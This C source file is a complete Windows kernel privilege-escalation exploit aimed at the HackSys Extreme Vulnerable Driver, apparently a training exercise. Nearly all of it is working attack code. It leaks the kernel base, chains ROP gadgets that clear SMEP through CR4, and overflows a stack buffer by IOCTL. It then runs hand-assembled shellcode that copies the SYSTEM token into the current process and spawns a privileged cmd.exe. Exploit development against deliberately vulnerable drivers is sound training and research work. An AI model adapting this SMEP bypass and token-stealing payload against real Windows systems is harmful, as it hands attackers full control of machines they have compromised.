#include "exploit.h"

unsigned char shellcode[] =
{
	0x48, 0x83, 0xEC, 0x58,													// sub     rsp, 58h
	0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,					// mov     [rsp+58h+Process], 0
	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD3,	// call    cs:__imp_PsGetCurrentProcessId
	0x48, 0x8D, 0x54, 0x24, 0x20,											// lea     rdx, [rsp+58h+Process] ; Process
	0x48, 0x8B, 0xC8,														// mov     rcx, rax        ; ProcessId
	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD3,	// call    cs:__imp_PsLookupProcessByProcessId
	0x48, 0x8B, 0x4C, 0x24, 0x20,											// mov     rcx, [rsp+58h+Process] ; Process
	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD3,	// call    cs:__imp_PsReferencePrimaryToken
	0x48, 0x89, 0x44, 0x24, 0x48,											// mov     [rsp+58h+PrimaryToken], rax
	0x48, 0xC7, 0xC0,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,		// mov     rax, cs:__imp_PsInitialSystemProcess
	0x48, 0x8B, 0x08,														// mov     rcx, [rax]      ; Process
	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD3,	// call    cs:__imp_PsReferencePrimaryToken
																			// ...
																			/*mov[rsp + 58h + var_20], rax
																			mov[rsp + 58h + var_30], 0
																			mov[rsp + 58h + var_28], 0
																			mov[rsp + 58h + var_18], 0
																			mov     rax,[rsp + 58h + Process]
																			add     rax, 4B8h
																			mov[rsp + 58h + var_30], rax
																			mov     rax,[rsp + 58h + var_30]
																			mov     rax,[rax]
																			and rax, 0FFFFFFFFFFFFFFF1h
																			mov[rsp + 58h + var_18], rax
																			mov     rax,[rsp + 58h + var_30]
																			mov[rsp + 58h + var_28], rax
																			mov     rax,[rsp + 58h + var_28]
																			mov     rcx,[rsp + 58h + var_20]
																			mov[rax], rcx*/
	0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0xC7, 0x44, 0x24, 0x28,
	0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x05, 0xB8,
	0x04, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B,
	0x44, 0x24, 0x28, 0x48, 0x8B, 0x00, 0x48, 0x83, 0xE0, 0xF1,
	0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24, 0x28,
	0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x30,
	0x48, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x89, 0x08,
																			// ...
	0x48, 0x8B, 0x4C, 0x24, 0x48,											// mov     rcx, [rsp+58h+PrimaryToken] ; PrimaryToken
	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD3,	// call    cs:__imp_PsDereferencePrimaryToken
	0x48, 0x8B, 0x4C, 0x24, 0x38,											// mov     rcx, [rsp+58h+var_20] ; PrimaryToken
	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD3,	// call    cs:__imp_PsDereferencePrimaryToken
	0x48, 0x8B, 0x4C, 0x24, 0x20,											// mov     rcx, [rsp+58h+Process] ; Object
	0x48, 0xBB, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xD3,	// call    cs:__imp_ObfDereferenceObject
	0x33, 0xC0, 0x48, 0x83, 0xC4, 0x58, 0xC3								// xor     eax, eax ... add     rsp, 58h ... retn
};

int main(int argc, char** argv)
{
	HANDLE h_hevd = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned long bytes_returned = 0;
	long long pop_rcx_gadget = 0, rcx_cr4_value = 0x70678, mov_cr4_rcx_gadget = 0, kernel_base = 0;
	unsigned long long* shellcode_address = 0;
	char unused = 0, output[1024], input[2104];

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	system("title Stack Buffer Overflow SMEP Bypass");

	printf("%s[!] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_hevd == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the HackSys Extreme Vulnerable Driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the HackSys Extreme Vulnerable Driver. Handle Value: 0x%p", h_hevd);

	kernel_base = leak_ntoskrnl_base_address();
	if (!kernel_base)
	{
		return 1;
	}

	pop_rcx_gadget = kernel_base + POP_RCX_OFFSET;
	mov_cr4_rcx_gadget = kernel_base + MOV_CR4_RCX_OFFSET;
	printf("\n[+] Calculated pop rcx + ret gadget address. Gadget Address: 0x%p\n[+] Calculated mov cr4, rcx + ret gadget address. Gadget Address: 0x%p\n[+] Calculated nt!PsGetCurrentProcessId function address. Function Address: 0x%p", (long long*)pop_rcx_gadget, (long long*)mov_cr4_rcx_gadget, (long long*)(kernel_base + PS_GET_CURRENT_PROCESS_ID_OFFSET));

	*(long long*)(shellcode + 14) = (long long)(kernel_base + PS_GET_CURRENT_PROCESS_ID_OFFSET);
	printf("\n[+] Mapped nt!PsGetCurrentProcessId address onto the shellcode.\n[+] Calculated nt!PsLookupProcessByProcessId function address. Function Address: 0x%p", (long long*)(kernel_base + PS_LOOKUP_PROCESS_BY_PROCESS_ID_OFFSET));

	*(long long*)(shellcode + 34) = (long long)(kernel_base + PS_LOOKUP_PROCESS_BY_PROCESS_ID_OFFSET);
	printf("\n[+] Mapped nt!PsLookupProcessByProcessId addresss onto the shellcode.\n[+] Calculated nt!PsReferencePrimaryToken function address. Function Address: 0x%p", (long long*)(kernel_base + PS_REFERENCE_PRIMARY_TOKEN_OFFSET));

	*(long long*)(shellcode + 51) = (long long)(kernel_base + PS_REFERENCE_PRIMARY_TOKEN_OFFSET);
	*(long long*)(shellcode + 82) = (long long)(kernel_base + PS_REFERENCE_PRIMARY_TOKEN_OFFSET);
	printf("\n[+] Mapped nt!PsReferencePrimaryToken address onto the shellcode.\n[+] Calculated nt!PsInitialSystemProcess variable address. Variable Address: 0x%p", (long long*)(kernel_base + PS_INITIAL_SYSTEM_PROCESS_OFFSET));

	*(long long*)(shellcode + 69) = (long long)(kernel_base + PS_INITIAL_SYSTEM_PROCESS_OFFSET);
	printf("\n[+] Mapped nt!PsInitialSystemProcess address onto the shellcode.\n[+] Calculated nt!PsDereferencePrimaryToken function address. Function Address: 0x%p", (long long*)(kernel_base + PS_DEREFERENCE_PRIMARY_TOKEN_OFFSET));

	*(long long*)(shellcode + 187) = (long long)(kernel_base + PS_DEREFERENCE_PRIMARY_TOKEN_OFFSET);
	*(long long*)(shellcode + 204) = (long long)(kernel_base + PS_DEREFERENCE_PRIMARY_TOKEN_OFFSET);
	printf("\n[+] Mapped nt!PsDereferencePrimaryToken onto the shellcode.\n[+] Calculated nt!ObfDereferenceObject function address. Function Address: 0x%p", (long long*)(kernel_base + OBF_DEREFERENCE_OBJECT_OFFSET));

	*(long long*)(shellcode + 221) = (long long)(kernel_base + OBF_DEREFERENCE_OBJECT_OFFSET);
	printf("\n[+] Mapped nt!ObfDereferenceObject onto the shellcode.");

	shellcode_address = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode_address)
	{
		printf("\n[-] Failed to allocate %d bytes of stack memory. Error: %d (0x%x)", (int)sizeof(shellcode), GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated %d bytes of stack memory. Shellcode Allocation Address: 0x%p", (int)sizeof(shellcode), shellcode_address);

	memcpy(shellcode_address, &shellcode, sizeof(shellcode));
	printf("\n[+] Mapped shellcode onto the allocation.");

	memset(&input, 'A', 2072);
	*(long long*)(input + 2072) = (long long*)pop_rcx_gadget;
	*(long long*)(input + 2080) = rcx_cr4_value;
	*(long long*)(input + 2088) = (long long*)mov_cr4_rcx_gadget;
	*(long long*)(input + 2096) = (long long*)shellcode_address;
	printf("\n[+] Crafted input buffer.\n[!] Redirecting code execution to payload address... Payload Address: 0x%p", (long long*)shellcode_address);

	Sleep(1000);

	DeviceIoControl(h_hevd, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);
	Sleep(1000);

	system("start cmd.exe");
	printf("\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}